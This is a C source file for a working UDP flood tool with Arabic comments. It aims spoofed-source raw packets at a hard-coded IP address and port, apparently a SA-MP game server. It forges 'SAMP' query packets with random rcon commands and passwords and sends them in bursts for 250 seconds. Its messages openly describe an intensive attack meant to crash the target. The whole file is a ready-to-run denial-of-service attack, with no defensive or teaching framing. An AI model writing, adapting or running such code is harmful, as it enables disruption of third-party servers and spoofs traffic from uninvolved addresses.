#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#define MAXSIZECMD 50
#define LEN 512

typedef unsigned short u16;
typedef unsigned long u32;

char comandos[15][16] = {"cmdlist", "varlist", "exit", "echo", "hostname", "gamemodetext", "mapname", "kick", "ban", "rcon_password", "players", "say", "gmx", "loadfs", "language"};
char abc[] = "abcdefghijklmnopqrstuvwxyz0123456789.";

unsigned short csum (unsigned short *buf, int nwords);
uint16_t udp_checksum(const struct iphdr *ip, const struct udphdr *udp, const uint16_t *buf);

void makeArrayIP(char* inIP, char *outIP){
    short i, nTemp = 0; char cbool = 0;
    for(i = 0; inIP[i] != '\0'; i++){
        if(inIP[i] != '.'){
            nTemp = nTemp * 10 + (short)(inIP[i] - '0');
        }else{
            outIP[cbool] = (char) nTemp;
            nTemp = 0;
            cbool++;
        }
    }
    outIP[cbool] = (char) nTemp;
}

int main(int argc, char * argv[])
{
    // ==========================================
    // الهدف المستهدف (IP والمنفذ)
    // ==========================================
    char * TARGET_IP = "94.23.168.153";  
    int TARGET_PORT = 2343;          
    int DURATION_SECONDS = 250;       // حدد وقت الإرسال بالثواني قبل التوقف التام

    srand(time(NULL));

    unsigned char ip[4];
    makeArrayIP(TARGET_IP, (char*)ip);
    char packet_dup[4];
    packet_dup[0] = ip[0];
    packet_dup[1] = ip[1];
    packet_dup[2] = ip[2];
    packet_dup[3] = ip[3];
   
    time_t start_time = time(NULL);
    unsigned long total_packets = 0;

    printf("[*] بدء الهجوم المكثف على الهدف %s:%d لمدة %d ثانية...\n", TARGET_IP, TARGET_PORT, DURATION_SECONDS);
    
    // حلقة زمنية دقيقة تتحكم بوقت الإرسال والتوقف
    while(time(NULL) - start_time < DURATION_SECONDS)
    {
        int iprang[4] = {186, 181, 201, 190};
        char ip_d[20];
        sprintf(ip_d, "%d.%d.%d.%d", iprang[rand() % 4], rand() % 250, rand() % 252, rand() % 208);
        int s_port = 1024 + (rand() % 48422);
        int PSOURCE = s_port;
        int PDEST = TARGET_PORT;
        char * SOURCE = ip_d;
        char * DEST = TARGET_IP;
        int s;
        struct sockaddr_in daddr, saddr;
        char packet[LEN];

        char rpaswd[6 + (rand() % 6)];
        for(unsigned long i = 0; i < sizeof(rpaswd) - 1; i++) rpaswd[i] = abc[rand() % 38];
        rpaswd[sizeof(rpaswd) - 1] = '\0';
        
        int sizepaswd = strlen(rpaswd);
        int ncmd = (rand() % 15);
        char cmdstring[MAXSIZECMD];
        sprintf(cmdstring, "%s ", comandos[ncmd]);
        int scmd = strlen(comandos[ncmd]) + 1;
        int sizerand = 4 + sizepaswd + scmd + 3 + (rand() % 10);
        
        for(int i = scmd; i < sizerand && i < MAXSIZECMD; i++) cmdstring[i] = abc[rand() % 38];

        struct iphdr *ip_header = (struct iphdr *)packet;  
        struct udphdr *udp = (struct udphdr *)((void *) ip_header + sizeof(struct iphdr));
 
        if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
            perror("socket error:");
            exit(EXIT_FAILURE);
        }
 
        daddr.sin_family = AF_INET;
        saddr.sin_family = AF_INET;
        daddr.sin_port = htons(PDEST);
        saddr.sin_port = htons(PSOURCE);
        inet_pton(AF_INET, DEST, (struct in_addr *)&daddr.sin_addr.s_addr);
        inet_pton(AF_INET, SOURCE, (struct in_addr *)&saddr.sin_addr.s_addr);
 
        memset(daddr.sin_zero, 0, sizeof(daddr.sin_zero));
        memset(saddr.sin_zero, 0, sizeof(saddr.sin_zero));
        memset(udp, 0, sizeof(struct udphdr));
        memset(ip_header, 0, sizeof(struct iphdr));
 
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0x0;
        ip_header->id = htons(rand() % 65535);
        ip_header->frag_off = 0;  
        ip_header->ttl = 90 + (rand() % 40);          
        ip_header->protocol = IPPROTO_UDP;  
        ip_header->check = 0;          
        ip_header->saddr = saddr.sin_addr.s_addr;
        ip_header->daddr = daddr.sin_addr.s_addr;
 
        udp->source = htons(PSOURCE);
        udp->dest = htons(PDEST);
 
        int sizedata = 11 + sizerand;
        if (sizedata > LEN - sizeof(struct iphdr) - sizeof(struct udphdr)) {
            sizedata = LEN - sizeof(struct iphdr) - sizeof(struct udphdr) - 1;
        }
       
        unsigned char * packet_pos = (unsigned char *)udp + sizeof(struct udphdr);
        memset(packet_pos, 'A', sizedata);
        
        packet_pos[0] = 0x53;  
        packet_pos[1] = 0x41;
        packet_pos[2] = 0x4D;
        packet_pos[3] = 0x50;  
        packet_pos[4] = packet_dup[0];
        packet_pos[5] = packet_dup[1];
        packet_pos[6] = packet_dup[2];
        packet_pos[7] = packet_dup[3];
        packet_pos[8] = (unsigned char)(PDEST & 0xFF);
        packet_pos[9] = (unsigned char)((PDEST >> 8) & 0xFF);
        packet_pos[10] = 0x78; 
        
        int sizeudpdata = sizeof(struct udphdr) + sizedata;
        ip_header->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    
        udp->len = htons(sizeudpdata);
        
        int optval = 1;
        setsockopt(s, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int));
            
        int sizepacket = sizeof(struct iphdr) + sizeudpdata;
        udp->check = 0;
        udp->check = udp_checksum(ip_header, udp, (const uint16_t *)udp);
        
        // إرسال مكثف ومتتالٍ بدون أي توقف داخلي لتعظيم الضغط وإحداث الـ Crash
        for(int burst = 0; burst < 10; burst++) {
            sendto(s, (char *)packet, sizepacket, 0, (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));
            total_packets++;
        }
        
        close(s);
    }
    
    printf("[*] انتهى الوقت المحدد! تم إيقاف إرسال الحزم بنجاح. إجمالي الحزم المرسلة: %lu\n", total_packets);
    exit(EXIT_SUCCESS);
}
 
struct pseudo_hdr {
    u_int32_t source;
    u_int32_t dest;
    u_int8_t zero; 
    u_int8_t protocol;
    u_int16_t udp_length;
};
 
uint16_t udp_checksum(const struct iphdr *ip_header, const struct udphdr *udp, const uint16_t *buf)
{
    int calculated_length = ntohs(udp->len)%2 == 0 ? ntohs(udp->len) : ntohs(udp->len) + 1;
    struct pseudo_hdr ps_hdr = {0};
    uint8_t data[sizeof(struct pseudo_hdr) + calculated_length];
    memset(data, 0, sizeof(data));
 
    ps_hdr.source = ip_header->saddr;
    ps_hdr.dest = ip_header->daddr;
    ps_hdr.protocol = IPPROTO_UDP; 
    ps_hdr.udp_length = udp->len;
 
    memcpy(data, &ps_hdr, sizeof(struct pseudo_hdr));
    memcpy(data + sizeof(struct pseudo_hdr), buf, ntohs(udp->len)); 
 
    return csum((uint16_t *)data, sizeof(data)/2);
}
 
unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}
